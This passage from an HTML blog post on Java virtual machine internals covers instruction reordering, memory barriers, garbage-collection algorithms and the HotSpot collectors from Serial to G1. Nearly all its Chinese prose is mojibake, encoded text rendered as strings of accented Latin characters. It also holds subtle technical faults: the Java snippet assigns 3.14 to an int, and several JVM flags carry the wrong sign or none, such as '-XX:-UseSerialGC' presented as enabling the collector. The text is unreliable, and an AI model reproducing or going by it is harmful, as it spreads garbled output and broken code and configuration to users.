CPUå’Œç¼–è¯‘å™¨ä¸ºäº†æå‡ç¨‹åºæ‰§è¡Œçš„æ•ˆç‡ï¼Œä¼šæŒ‰ç…§ä¸€å®šçš„è§„åˆ™å…è®¸è¿›è¡ŒæŒ‡ä»¤ä¼˜åŒ–ã€‚æŒ‡ä»¤é‡æ’ä¼šä¿è¯å•çº¿ç¨‹æ‰§è¡Œç»“æœä¸ä¼šæ”¹å˜ã€‚</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> <span class="number">4</span>;            <span class="comment">// 1.1 </span></span><br><span class="line"><span class="type">int</span> <span class="variable">pi</span> <span class="operator">=</span> <span class="number">3.14</span>;        <span class="comment">// 1.2</span></span><br><span class="line"><span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> pi * r * r;   <span class="comment">// 1.3</span></span><br></pre></td></tr></table></figure><p>  è¿™æ®µä»£ç å®é™…æ‰§è¡Œæ—¶å¯èƒ½æ˜¯ <code>1.1 -&gt; 1.2 -&gt; 1.3</code>ï¼Œä¹Ÿå¯èƒ½ä¼šæ˜¯ <code>1.2 -&gt; 1.1 -&gt; 1.3</code>ã€‚åªè¦é€»è¾‘ä¸Šæ²¡æœ‰ä¾èµ–å…³ç³»ï¼Œä¸å½±å“æœ€ç»ˆç»“æœçš„éƒ½å¯èƒ½ä¼šé‡æ’ã€‚</p></li><li><p>å†…å­˜å±éšœ</p><p>  åœ¨å¤šçº¿ç¨‹ç¯å¢ƒé‡Œéœ€è¦ä½¿ç”¨æŸç§æŠ€æœ¯æ¥ä½¿ç¨‹åºç»“æœå°½å¿«å¯è§ã€‚ä¸€æ—¦å†…å­˜æ•°æ®è¢«æ¨é€åˆ°ç¼“å­˜ï¼Œå°±ä¼šæœ‰æ¶ˆæ¯åè®®æ¥ç¡®ä¿æ‰€æœ‰çš„ç¼“å­˜ä¼šå¯¹æ‰€æœ‰çš„å…±äº«æ•°æ®åŒæ­¥å¹¶ä¿æŒä¸€è‡´ã€‚è¿™ä¸ªä½¿å†…å­˜æ•°æ®å¯¹CPUæ ¸å¯è§çš„æŠ€æœ¯è¢«ç§°ä¸ºå†…å­˜å±éšœæˆ–å†…å­˜æ …æ ã€‚å†…å­˜å±éšœä¹‹å‰çš„æ‰€æœ‰å†™æ“ä½œéƒ½è¦å†™å…¥å†…å­˜ï¼›å†…å­˜å±éšœä¹‹åçš„è¯»æ“ä½œéƒ½å¯ä»¥è·å¾—åŒæ­¥å±éšœä¹‹å‰çš„å†™æ“ä½œçš„ç»“æœã€‚å› æ­¤ï¼Œå¯¹äºæ•æ„Ÿçš„ç¨‹åºå—ï¼Œå†™æ“ä½œä¹‹åã€è¯»æ“ä½œä¹‹å‰å¯ä»¥æ’å…¥å†…å­˜å±éšœã€‚</p></li></ul><h3 id="åƒåœ¾å›æ”¶"><a href="#åƒåœ¾å›æ”¶" class="headerlink" title="åƒåœ¾å›æ”¶"></a>åƒåœ¾å›æ”¶</h3><p>åƒåœ¾å›æ”¶çš„ä¼˜ç‚¹æ˜¯ç¨‹åºå‘˜ä¸éœ€è¦å†æ‰‹åŠ¨å»ç®¡ç†å†…å­˜äº†ï¼Œå®ƒçš„ç¼ºç‚¹æ˜¯åœ¨å›æ”¶è¿‡ç¨‹ä¸­ç¨‹åºä¼šå‡ºç°çŸ­æš‚æš‚åœï¼Œè¿™åœ¨æŸäº›åœºæ™¯ä¸‹æ˜¯ä¸èƒ½å…è®¸çš„ã€‚</p><blockquote><p>åœ¨æ ‡è®°é˜¶æ®µå¿…é¡»è¦æš‚åœä¸€å®šçš„æ—¶é—´æ¥éå†<code>GC Roots</code>é“¾ï¼Œä¸å¯ä»¥å‡ºç°åˆ†æè¿‡ç¨‹ä¸­å¯¹è±¡å¼•ç”¨å…³ç³»è¿˜åœ¨ä¸æ–­å˜åŒ–çš„æƒ…å†µï¼Œè¯¥ç‚¹ä¸æ»¡è¶³çš„è¯åˆ†æç»“æœå‡†ç¡®æ€§å°±æ— æ³•å¾—åˆ°ä¿è¯ã€‚</p></blockquote><h4 id="GCä¸»è¦ç®—æ³•"><a href="#GCä¸»è¦ç®—æ³•" class="headerlink" title="GCä¸»è¦ç®—æ³•"></a>GCä¸»è¦ç®—æ³•</h4><ol><li><p>å¼•ç”¨è®¡æ•°ç®—æ³•</p><p> ç»™å¯¹è±¡ä¸­æ·»åŠ ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œæ¯å½“æœ‰ä¸€ä¸ªåœ°æ–¹å¼•ç”¨å®ƒæ—¶ï¼Œè®¡æ•°å™¨å€¼å°±åŠ 1ï¼›å½“å¼•ç”¨å¤±æ•ˆæ—¶ï¼Œè®¡æ•°å™¨å€¼å°±å‡1ï¼›ä»»ä½•æ—¶åˆ»è®¡æ•°å™¨ä¸º0çš„å¯¹è±¡å°±æ˜¯ä¸å¯èƒ½å†è¢«ä½¿ç”¨çš„ã€‚</p><p> å¼•ç”¨è®¡æ•°ç®—æ³•æœ‰å¯ä»¥ç«‹å³å›æ”¶ã€ä¸ç”¨éå†æ•´ä¸ªå †ç­‰ä¼˜ç‚¹ï¼Œä½†æ˜¯å®ƒæ¯”è¾ƒå°‘ä½¿ç”¨ï¼Œå› ä¸ºå®ƒæœ‰ä¸ªå¾ˆå¤§çš„ç¼ºç‚¹æ˜¯ä¸èƒ½è§£å†³ç›¸äº’ä¾èµ–é—®é¢˜ã€‚</p></li><li><p>æ ‡è®°-æ¸…é™¤ç®—æ³•</p><p> æ ‡è®°æ¸…é™¤ç®—æ³•åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œæ ‡è®°å’Œæ¸…é™¤ã€‚ç¬¬ä¸€é˜¶æ®µä½¿ç”¨å¯è¾¾æ€§åˆ†æç®—æ³•ä»<code>GC Roots</code>ä½œä¸ºèµ·ç‚¹å¼€å§‹æœç´¢ã€‚å½“ä¸€ä¸ªå¯¹è±¡åˆ°GC Rootsæ²¡æœ‰ä»»ä½•å¼•ç”¨é“¾ç›¸è¿æ—¶ï¼Œåˆ™è¯æ˜æ­¤å¯¹è±¡æ˜¯ä¸å¯ç”¨çš„ï¼Œå®ƒä»¬å°†ä¼šè¢«åˆ¤å®šä¸ºæ˜¯å¯å›æ”¶çš„å¯¹è±¡ã€‚</p><p> é¦–å…ˆæ ‡è®°å‡ºæ‰€æœ‰éœ€è¦å›æ”¶çš„å¯¹è±¡ï¼Œåœ¨æ ‡è®°å®Œæˆåç»Ÿä¸€å›æ”¶æ‰€æœ‰è¢«æ ‡è®°çš„å¯¹è±¡ã€‚è¿™ç§ç®—æ³•æœ‰ä¸ªç¼ºç‚¹ï¼Œæ¸…é™¤åå†…å­˜ä¸Šä¼šæœ‰å¤§é‡ç©ºæ´ï¼Œå­˜åœ¨å¤§é‡ä¸è¿ç»­çš„ç©ºé—´ã€‚å¦‚æœåˆ†é…è¾ƒå¤§å†…å­˜çš„å¯¹è±¡æ—¶å¯èƒ½ä¼šå‡ºç°å†…å­˜é—®é¢˜ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåœ¨è¿™ä¸ªåŸºç¡€ä¸Šäººä»¬åˆæå‡ºäº†ä¸‹é¢çš„å¤åˆ¶ç®—æ³•ã€‚</p></li><li><p>GCå¤åˆ¶ç®—æ³•</p><p> å¤åˆ¶ç®—æ³•å°†å†…å­˜åˆ†ä¸ºå¤§å°ç›¸åŒçš„ä¸¤å—ï¼Œæ¯æ¬¡åªæ˜¯ç”¨å…¶ä¸­ä¸€å—ã€‚å½“å…¶ä¸­ä¸€å—æ»¡äº†ä»¥åå°†é‡Œé¢å­˜æ´»çš„å¯¹è±¡å…¨éƒ¨å¤åˆ¶åˆ°å¦ä¸€å—å»ï¼Œç„¶åå°†è¿™å—å†…å­˜å…¨éƒ¨æ¸…ç†æ‰ã€‚è¿™ç§ç®—æ³•çš„ç¼ºç‚¹å°±æ˜¯æ¯æ¬¡åªèƒ½ä½¿ç”¨ä¸€åŠå†…å­˜ï¼Œå­˜åœ¨ä¸€äº›æµªè´¹çš„é—®é¢˜ã€‚</p><p> æ ¹æ®ç ”ç©¶è¡¨åï¼Œå¤§éƒ¨åˆ†æ–°å¯¹è±¡ç»è¿‡ä¸€æ¬¡GCå°±ä¼šè¢«å›æ”¶æ‰ï¼Œæ‰€ä»¥ä¸éœ€è¦æŒ‰ç…§1:1çš„æ¯”ä¾‹æ¥åˆ’åˆ†ä¸¤å—å†…å­˜ï¼Œè€Œæ˜¯å°†å†…å­˜åˆ†ä¸ºä¸€ä»½è¾ƒå¤§çš„<code>Eden</code>ç©ºé—´å’Œä¸¤ä»½<code>Survivor</code>ç©ºé—´ã€‚æ¯æ¬¡åªä½¿ç”¨<code>Eden</code>å’Œä¸€ä»½<code>Survivor</code>ç©ºé—´ï¼Œå½“å›æ”¶æ—¶å°†<code>Eden</code>å’Œæ­£åœ¨ä½¿ç”¨çš„<code>Survivor</code>ç©ºé—´é‡Œé¢å­˜æ´»çš„å¯¹è±¡å…¨éƒ½å¤åˆ¶åˆ°å¦ä¸€ä¸ª<code>Survivor</code>ç©ºé—´ä¸­ã€‚ç„¶åä¸€æ¬¡æ€§æ¸…ç†æ‰åŸæ¥çš„<code>Eden</code>å’Œ<code>Survivor</code>ç©ºé—´ã€‚è¿™æ ·æ¯æ¬¡åªæµªè´¹ä¸€ä»½<code>Survivor</code>çš„å†…å­˜ï¼ŒHotSpotè™šæ‹Ÿæœºé»˜è®¤Edenå’ŒSurvivorçš„å¤§å°æ¯”ä¾‹æ˜¯8:1ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯æ¬¡åªæµªè´¹10%çš„å†…å­˜ç©ºé—´ã€‚</p></li><li><p>æ ‡è®°-æ•´ç†ç®—æ³•</p><p> æ ‡è®°æ•´ç†ç®—æ³•æ˜¯åœ¨ä¸Šè¿°ç®—æ³•åŸºç¡€ä¸Šå‘å±•è€Œæ¥çš„ã€‚å®ƒä¼šä½¿ç”¨æ•´ä¸ªå†…å­˜ï¼Œæ ‡è®°é˜¶æ®µå®Œæˆåå°†å­˜æ´»çš„å¯¹è±¡æœå†…å­˜çš„ä¸€ç«¯ç§»åŠ¨ï¼Œç„¶åç›´æ¥æ¸…ç†æ‰ç«¯è¾¹ç•Œä»¥å¤–çš„å†…å­˜ã€‚</p></li></ol><h4 id="Javaä¸­çš„GC"><a href="#Javaä¸­çš„GC" class="headerlink" title="Javaä¸­çš„GC"></a>Javaä¸­çš„GC</h4><p><code>HotSpot</code>ï¼ˆåŒ…æ‹¬å…¶å®ƒä¸»æµè™šæ‹Ÿæœºï¼‰éƒ½é‡‡ç”¨<code>åˆ†ä»£æ”¶é›†</code>çš„ç­–ç•¥ï¼Œè¿™ä¸»è¦æ˜¯å› ä¸ºæ–°å¯¹è±¡å’Œè€å¯¹è±¡å­˜æ´»å‘¨æœŸä¸åŒã€‚ä¸€èˆ¬çš„æ–°å¯¹è±¡æ™®éåœ¨ä¸€è½®GCåå°±è¢«å›æ”¶äº†ï¼Œå¦‚æœå¯¹è±¡ç»è¿‡ä¸¤è½®GCè¿˜æ´»ç€é‚£å¯èƒ½è¿™ä¸ªå¯¹è±¡è¿˜ä¼šå­˜æ´»å¾ˆä¹…ã€‚å¯¹è±¡å­˜æ´»å‘¨æœŸä¸åŒï¼Œè¿™å°±ä½¿æˆ‘ä»¬åœ¨è¿›è¡Œåƒåœ¾å›æ”¶æ—¶é€‰æ‹©ä¸åŒçš„ç­–ç•¥æ¥å›æ”¶ä¸¤ç§å¯¹è±¡ã€‚</p><p><code>HotSpot</code>ä¸­æœ‰å‡ ç§åƒåœ¾å›æ”¶å™¨ï¼Œä¸åŒçš„åƒåœ¾å›æ”¶å™¨ä½¿ç”¨äº†ä¸åŒçš„ç®—æ³•ã€‚</p><p><img src="/images/garbage-collector.png"></p><ul><li><p>Serialæ”¶é›†å™¨</p><p>  Serialæ”¶é›†å™¨æ˜¯æœ€å¤è€çš„æ”¶é›†å™¨ï¼Œå®ƒçš„ç¼ºç‚¹æ˜¯å½“Serialæ”¶é›†å™¨æƒ³è¿›è¡Œåƒåœ¾å›æ”¶çš„æ—¶å€™ï¼Œå¿…é¡»æš‚åœç”¨æˆ·çš„æ‰€æœ‰è¿›ç¨‹ï¼Œå³<code>stop the world</code>ã€‚åˆ°ç°åœ¨ä¸ºæ­¢ï¼Œå®ƒä¾ç„¶æ˜¯è™šæ‹Ÿæœºè¿è¡Œåœ¨clientæ¨¡å¼ä¸‹çš„é»˜è®¤æ–°ç”Ÿä»£æ”¶é›†å™¨ï¼Œä¸å…¶ä»–æ”¶é›†å™¨ç›¸æ¯”ï¼Œå¯¹äºé™å®šåœ¨å•ä¸ªCPUçš„è¿è¡Œç¯å¢ƒæ¥è¯´ï¼ŒSerialæ”¶é›†å™¨ç”±äºæ²¡æœ‰çº¿ç¨‹äº¤äº’çš„å¼€é”€ï¼Œä¸“å¿ƒåšåƒåœ¾å›æ”¶è‡ªç„¶å¯ä»¥è·å¾—æœ€é«˜çš„å•çº¿ç¨‹æ”¶é›†æ•ˆç‡ã€‚</p><p>  Serial Oldæ˜¯Serialæ”¶é›†å™¨çš„è€å¹´ä»£ç‰ˆæœ¬ï¼Œå®ƒåŒæ ·æ˜¯ä¸€ä¸ªå•çº¿ç¨‹æ”¶é›†å™¨ï¼Œä½¿ç”¨<code>æ ‡è®°ï¼æ•´ç†</code>ç®—æ³•ã€‚è¿™ä¸ªæ”¶é›†å™¨çš„ä¸»è¦æ„ä¹‰ä¹Ÿæ˜¯è¢«Clientæ¨¡å¼ä¸‹çš„è™šæ‹Ÿæœºä½¿ç”¨ã€‚åœ¨Serveræ¨¡å¼ä¸‹ï¼Œå®ƒä¸»è¦è¿˜æœ‰ä¸¤å¤§ç”¨é€”ï¼šä¸€ä¸ªæ˜¯åœ¨JDK1.5åŠä»¥å‰çš„ç‰ˆæœ¬ä¸­ä¸Parallel Scanvengeæ”¶é›†å™¨æ­é…ä½¿ç”¨ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯ä½œä¸ºCMSæ”¶é›†å™¨çš„åå¤‡é¢„æ¡ˆï¼Œåœ¨å¹¶å‘æ”¶é›†å‘ç”ŸConcurrent Mode Failureçš„æ—¶å€™ä½¿ç”¨ã€‚</p><p>  é€šè¿‡æŒ‡å®š<code>-XX:-UseSerialGC</code>å‚æ•°ï¼Œä½¿ç”¨Serial + Serial Oldçš„ä¸²è¡Œæ”¶é›†å™¨ç»„åˆè¿›è¡Œå†…å­˜å›æ”¶ã€‚</p></li><li><p>ParNewæ”¶é›†å™¨</p><p>  ParNewæ”¶é›†å™¨æ˜¯Serialæ”¶é›†å™¨æ–°ç”Ÿä»£çš„å¤šçº¿ç¨‹å®ç°ï¼Œæ³¨æ„åœ¨è¿›è¡Œåƒåœ¾å›æ”¶çš„æ—¶å€™ä¾ç„¶ä¼š<code>stop the world</code>ï¼Œåªæ˜¯ç›¸æ¯”è¾ƒSerialæ”¶é›†å™¨è€Œè¨€å®ƒä¼šè¿è¡Œå¤šæ¡çº¿ç¨‹è¿›è¡Œåƒåœ¾å›æ”¶ã€‚</p><p>  ParNewæ”¶é›†å™¨åœ¨å•CPUçš„ç¯å¢ƒä¸­ç»å¯¹ä¸ä¼šæœ‰æ¯”Serialæ”¶é›†å™¨æ›´å¥½çš„æ•ˆæœï¼Œç”šè‡³ç”±äºå­˜åœ¨çº¿ç¨‹äº¤äº’çš„å¼€é”€ï¼Œè¯¥æ”¶é›†å™¨åœ¨é€šè¿‡è¶…çº¿ç¨‹æŠ€æœ¯å®ç°çš„ä¸¤ä¸ªCPUçš„ç¯å¢ƒä¸­éƒ½ä¸èƒ½ç™¾åˆ†ä¹‹ç™¾çš„ä¿è¯èƒ½è¶…è¶ŠSerialæ”¶é›†å™¨ã€‚å½“ç„¶ï¼Œéšç€å¯ä»¥ä½¿ç”¨çš„CPUçš„æ•°é‡å¢åŠ ï¼Œå®ƒå¯¹äºGCæ—¶ç³»ç»Ÿèµ„æºçš„åˆ©ç”¨è¿˜æ˜¯å¾ˆæœ‰å¥½å¤„çš„ã€‚å®ƒé»˜è®¤å¼€å¯çš„æ”¶é›†çº¿ç¨‹æ•°ä¸CPUçš„æ•°é‡ç›¸åŒï¼Œåœ¨CPUéå¸¸å¤šï¼ˆè­¬å¦‚32ä¸ªï¼Œç°åœ¨CPUåŠ¨è¾„4æ ¸åŠ è¶…çº¿ç¨‹ï¼ŒæœåŠ¡å™¨è¶…è¿‡32ä¸ªé€»è¾‘CPUçš„æƒ…å†µè¶Šæ¥è¶Šå¤šäº†ï¼‰çš„ç¯å¢ƒä¸‹ï¼Œå¯ä»¥ä½¿ç”¨<code>-XX:ParallelGCThreads</code>å‚æ•°æ¥é™åˆ¶åƒåœ¾æ”¶é›†çš„çº¿ç¨‹æ•°ã€‚</p><p>  <code>-XX:-UseParNewGC</code>æ‰“å¼€æ­¤å¼€å…³åï¼Œä½¿ç”¨ParNew + Serial Oldçš„æ”¶é›†å™¨ç»„åˆè¿›è¡Œå†…å­˜å›æ”¶ï¼Œè¿™æ ·æ–°ç”Ÿä»£ä½¿ç”¨å¹¶è¡Œæ”¶é›†å™¨ï¼Œè€å¹´ä»£ä½¿ç”¨ä¸²è¡Œæ”¶é›†å™¨ã€‚å¦‚æœé…ç½®<code>-XX:+UseConcMarkSweepGC</code>é€‰é¡¹åçš„é»˜è®¤æ–°ç”Ÿä»£æ”¶é›†å™¨ä¹Ÿæ˜¯ParNewæ”¶é›†å™¨ã€‚</p></li><li><p>Parallel Scavengeæ”¶é›†å™¨</p><p>  Parallelæ˜¯é‡‡ç”¨å¤åˆ¶ç®—æ³•çš„å¤šçº¿ç¨‹æ–°ç”Ÿä»£åƒåœ¾å›æ”¶å™¨ï¼Œä¼¼ä¹å’ŒParNewæ”¶é›†å™¨æœ‰å¾ˆå¤šçš„ç›¸ä¼¼çš„åœ°æ–¹ã€‚ä½†æ˜¯Parallel Scanvengeæ”¶é›†å™¨çš„ä¸€ä¸ªç‰¹ç‚¹æ˜¯å®ƒæ‰€å…³æ³¨çš„ç›®æ ‡æ˜¯<strong>ååé‡</strong>(Throughput)ã€‚æ‰€è°“ååé‡å°±æ˜¯CPUç”¨äºè¿è¡Œç”¨æˆ·ä»£ç çš„æ—¶é—´ä¸CPUæ€»æ¶ˆè€—æ—¶é—´çš„æ¯”å€¼ï¼Œå³<code>ååé‡ = è¿è¡Œç”¨æˆ·ä»£ç æ—¶é—´ / (è¿è¡Œç”¨æˆ·ä»£ç æ—¶é—´ + åƒåœ¾æ”¶é›†æ—¶é—´)</code>ï¼Œè™šæ‹Ÿæœºæ€»å…±è¿è¡Œäº†100åˆ†é’Ÿï¼Œå…¶ä¸­åƒåœ¾æ”¶é›†èŠ±æ‰1åˆ†é’Ÿï¼Œé‚£ååé‡å°±æ˜¯99%ã€‚Parallel Oldæ”¶é›†å™¨æ˜¯Parallel Scavengeæ”¶é›†å™¨çš„è€å¹´ä»£ç‰ˆæœ¬ï¼Œé‡‡ç”¨å¤šçº¿ç¨‹å’Œ<code>æ ‡è®°ï¼æ•´ç†</code>ç®—æ³•ã€‚è¿™ä¸ªæ”¶é›†å™¨æ˜¯åœ¨jdk1.6ä¸­æ‰å¼€å§‹æä¾›çš„ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œæ–°ç”Ÿä»£çš„Parallel Scavengeæ”¶é›†å™¨ä¸€ç›´å¤„äºæ¯”è¾ƒå°´å°¬çš„çŠ¶æ€ã€‚åŸå› æ˜¯å¦‚æœæ–°ç”Ÿä»£Parallel Scavengeæ”¶é›†å™¨ï¼Œé‚£ä¹ˆè€å¹´ä»£é™¤äº†Serial Old(PS MarkSweep)æ”¶é›†å™¨å¤–åˆ«æ— é€‰æ‹©ã€‚ç”±äºå•çº¿ç¨‹çš„è€å¹´ä»£Serial Oldæ”¶é›†å™¨åœ¨æœåŠ¡ç«¯åº”ç”¨æ€§èƒ½ä¸Šçš„â€æ‹–ç´¯â€ï¼Œå³ä½¿ä½¿ç”¨äº†Parallel Scavengeæ”¶é›†å™¨ä¹Ÿæœªå¿…èƒ½åœ¨æ•´ä½“åº”ç”¨ä¸Šè·å¾—ååé‡æœ€å¤§åŒ–çš„æ•ˆæœï¼Œåˆå› ä¸ºè€å¹´ä»£æ”¶é›†ä¸­æ— æ³•å……åˆ†åˆ©ç”¨æœåŠ¡å™¨å¤šCPUçš„å¤„ç†èƒ½åŠ›ï¼Œåœ¨è€å¹´ä»£å¾ˆå¤§è€Œä¸”ç¡¬ä»¶æ¯”è¾ƒé«˜çº§çš„ç¯å¢ƒä¸­ï¼Œè¿™ç§ç»„åˆçš„ååé‡ç”šè‡³è¿˜ä¸ä¸€å®šæœ‰ParNewåŠ CMSçš„ç»„åˆâ€ç»™åŠ›â€ã€‚ç›´åˆ°Parallel Oldæ”¶é›†å™¨å‡ºç°åï¼Œâ€ååé‡ä¼˜å…ˆâ€æ”¶é›†å™¨ç»ˆäºæœ‰äº†æ¯”è¾ƒåå‰¯å…¶å®çš„åº”ç”¨ï¼Œåœ¨æ³¨é‡ååé‡åŠCPUèµ„æºæ•æ„Ÿçš„åœºåˆï¼Œéƒ½å¯ä»¥ä¼˜å…ˆè€ƒè™‘Parallel ScavengeåŠ Parallel Oldæ”¶é›†å™¨ã€‚</p><p>  Parallel Scavengeæ”¶é›†å™¨æä¾›äº†ä¸¤ä¸ªå‚æ•°ç”¨äºç²¾ç¡®æ§åˆ¶ååé‡ï¼Œåˆ†åˆ«æ˜¯æ§åˆ¶æœ€å¤§åƒåœ¾æ”¶é›†åœé¡¿æ—¶é—´çš„<code>-XX:MaxGCPauseMillis</code>å‚æ•°ä»¥åŠç›´æ¥è®¾ç½®ååé‡å¤§å°çš„<code>-XX:GCTimeRatio</code>å‚æ•°ã€‚</p><p>  <code>-XX:UseParallelGC</code>è™šæ‹Ÿæœºè¿è¡Œåœ¨Serveræ¨¡å¼ä¸‹çš„é»˜è®¤å€¼ï¼Œæ‰“å¼€æ­¤å¼€å…³åï¼Œä½¿ç”¨Parallel Scavenge + Serial Oldçš„æ”¶é›†å™¨ç»„åˆè¿›è¡Œå†…å­˜å›æ”¶ã€‚<code>-XX:UseParallelOldGC</code>æ‰“å¼€æ­¤å¼€å…³åï¼Œä½¿ç”¨Parallel Scavenge + Parallel Oldçš„æ”¶é›†å™¨ç»„åˆè¿›è¡Œåƒåœ¾å›æ”¶ã€‚</p></li><li><p>CMSæ”¶é›†å™¨</p><p>  CMS(Concurrent Mark Swep)æ”¶é›†å™¨æ˜¯ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„å›æ”¶å™¨ï¼Œç°åœ¨åº”ç”¨éå¸¸å¹¿æ³›ï¼Œæˆ‘ä»¬é‡ç‚¹æ¥çœ‹ä¸€ä¸‹ï¼ŒCMSä¸€ç§è·å–æœ€çŸ­å›æ”¶åœé¡¿æ—¶é—´ä¸ºç›®æ ‡çš„æ”¶é›†å™¨ï¼Œè¿™ä½¿å¾—å®ƒå¾ˆé€‚åˆç”¨äºå’Œç”¨æˆ·äº¤äº’çš„ä¸šåŠ¡ã€‚ä»åå­—(Mark Swep)å°±å¯ä»¥çœ‹å‡ºï¼ŒCMSæ”¶é›†å™¨æ˜¯åŸºäºæ ‡è®°æ¸…é™¤ç®—æ³•å®ç°çš„ã€‚å®ƒçš„æ”¶é›†è¿‡ç¨‹åˆ†ä¸ºå››ä¸ªæ­¥éª¤ï¼š</p><ol><li>åˆå§‹æ ‡è®°(initial mark)</li><li>å¹¶å‘æ ‡è®°(concurrent mark)</li><li>é‡æ–°æ ‡è®°(remark)</li><li>å¹¶å‘æ¸…é™¤(concurrent sweep)</li></ol><p>  æ³¨æ„åˆå§‹æ ‡è®°å’Œé‡æ–°æ ‡è®°è¿˜æ˜¯ä¼šstop the worldï¼Œä½†æ˜¯åœ¨è€—è´¹æ—¶é—´æ›´é•¿çš„å¹¶å‘æ ‡è®°å’Œå¹¶å‘æ¸…é™¤ä¸¤ä¸ªé˜¶æ®µéƒ½å¯ä»¥å’Œç”¨æˆ·è¿›ç¨‹åŒæ—¶å·¥ä½œã€‚</p><p>  ä¸è¿‡ç”±äºCMSæ”¶é›†å™¨æ˜¯åŸºäºæ ‡è®°æ¸…é™¤ç®—æ³•å®ç°çš„ï¼Œä¼šå¯¼è‡´æœ‰å¤§é‡çš„ç©ºé—´ç¢ç‰‡äº§ç”Ÿï¼Œåœ¨ä¸ºå¤§å¯¹è±¡åˆ†é…å†…å­˜çš„æ—¶å€™ï¼Œå¾€å¾€ä¼šå‡ºç°è€å¹´ä»£è¿˜æœ‰å¾ˆå¤§çš„ç©ºé—´å‰©ä½™ï¼Œä½†æ˜¯æ— æ³•æ‰¾åˆ°è¶³å¤Ÿå¤§çš„è¿ç»­ç©ºé—´æ¥åˆ†é…å½“å‰å¯¹è±¡ï¼Œä¸å¾—ä¸æå‰å¼€å¯ä¸€æ¬¡Full GCã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒCMSæ”¶é›†å™¨é»˜è®¤æä¾›äº†ä¸€ä¸ª<code>-XX:+UseCMSCompactAtFullCollection</code>æ”¶é›†å¼€å…³å‚æ•°ï¼ˆé»˜è®¤å°±æ˜¯å¼€å¯çš„)ï¼Œç”¨äºåœ¨CMSæ”¶é›†å™¨è¿›è¡ŒFullGCå®Œå¼€å¯å†…å­˜ç¢ç‰‡çš„åˆå¹¶æ•´ç†è¿‡ç¨‹ï¼Œå†…å­˜æ•´ç†çš„è¿‡ç¨‹æ˜¯æ— æ³•å¹¶å‘çš„ï¼Œè¿™æ ·å†…å­˜ç¢ç‰‡é—®é¢˜å€’æ˜¯æ²¡æœ‰äº†ï¼Œä¸è¿‡åœé¡¿æ—¶é—´ä¸å¾—ä¸å˜é•¿ã€‚è™šæ‹Ÿæœºè®¾è®¡è€…è¿˜æä¾›äº†å¦å¤–ä¸€ä¸ªå‚æ•°<code>-XX:CMSFullGCsBeforeCompaction</code>å‚æ•°ç”¨äºè®¾ç½®æ‰§è¡Œå¤šå°‘æ¬¡ä¸å‹ç¼©çš„FULL GCåè·Ÿç€æ¥ä¸€æ¬¡å¸¦å‹ç¼©çš„ï¼ˆé»˜è®¤å€¼ä¸º0ï¼Œè¡¨ç¤ºæ¯æ¬¡è¿›å…¥Full GCæ—¶éƒ½è¿›è¡Œç¢ç‰‡æ•´ç†ï¼‰ã€‚</p><p>  ä¸å¹¸çš„æ˜¯ï¼Œå®ƒä½œä¸ºè€å¹´ä»£çš„æ”¶é›†å™¨ï¼Œå´æ— æ³•ä¸jdk1.4ä¸­å·²ç»å­˜åœ¨çš„æ–°ç”Ÿä»£æ”¶é›†å™¨Parallel Scavengeé…åˆå·¥ä½œï¼Œæ‰€ä»¥åœ¨jdk1.5ä¸­ä½¿ç”¨CMSæ¥æ”¶é›†è€å¹´ä»£çš„æ—¶å€™ï¼Œæ–°ç”Ÿä»£åªèƒ½é€‰æ‹©ParNewæˆ–Serialæ”¶é›†å™¨ä¸­çš„ä¸€ä¸ªã€‚</p><p>  <code>-XX:CMSInitiatingOccupancyFraction</code>é…ç½®å¯ä»¥è®¾ç½®è€å¹´ä»£ä½¿ç”¨äº†å¤šå°‘ç©ºé—´åæ‰è¿›è¡ŒGCã€‚é»˜è®¤æ˜¯68%ï¼Œè¿™æ˜¯ä¸€ä¸ªåä¿å®ˆçš„è®¾ç½®ï¼Œæˆ‘ä»¬å¯ä»¥é€‚å½“çš„è°ƒé«˜è¿™ä¸ªå‚æ•°ã€‚é™¤äº†å‰é¢çš„é…ç½®å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦é…ç½®<code>-XX:+UseCMSInitiatingOccupancyOnly</code>è¿™è¦æ±‚JVMä¸åŸºäºè¿è¡Œæ—¶çš„æ•°æ®æ¥è¿›è¡ŒGCï¼Œæ¯æ¬¡JVMéƒ½é€šè¿‡CMSInitiatingOccupancyFractionçš„å€¼è¿›è¡ŒCMSæ”¶é›†ã€‚</p></li><li><p>G1æ”¶é›†å™¨</p><p>  G1æ”¶é›†å™¨æ˜¯ä¸€æ¬¾é¢å‘æœåŠ¡ç«¯åº”ç”¨çš„åƒåœ¾æ”¶é›†å™¨ã€‚HotSpotå›¢é˜Ÿèµ‹äºˆå®ƒçš„ä½¿å‘½æ˜¯åœ¨æœªæ¥æ›¿æ¢æ‰JDK1.5ä¸­å‘å¸ƒçš„CMSæ”¶é›†å™¨ã€‚ä¸å…¶ä»–GCæ”¶é›†å™¨ç›¸æ¯”ï¼ŒG1å…·å¤‡å¦‚ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li><p>å¹¶è¡Œä¸å¹¶å‘</p><p>  G1èƒ½æ›´å……åˆ†çš„åˆ©ç”¨CPUï¼Œå¤šæ ¸ç¯å¢ƒä¸‹çš„ç¡¬ä»¶ä¼˜åŠ¿æ¥ç¼©çŸ­stop the worldçš„åœé¡¿æ—¶é—´ã€‚</p></li><li><p>åˆ†ä»£æ”¶é›†</p><p>  å’Œå…¶ä»–æ”¶é›†å™¨ä¸€æ ·ï¼Œåˆ†ä»£çš„æ¦‚å¿µåœ¨G1ä¸­ä¾ç„¶å­˜åœ¨ï¼Œä¸è¿‡G1ä¸éœ€è¦å…¶ä»–çš„åƒåœ¾å›æ”¶å™¨çš„é…åˆå°±å¯ä»¥ç‹¬è‡ªç®¡ç†æ•´ä¸ªGCå †ã€‚</p></li><li><p>ç©ºé—´æ•´åˆ</p><p>  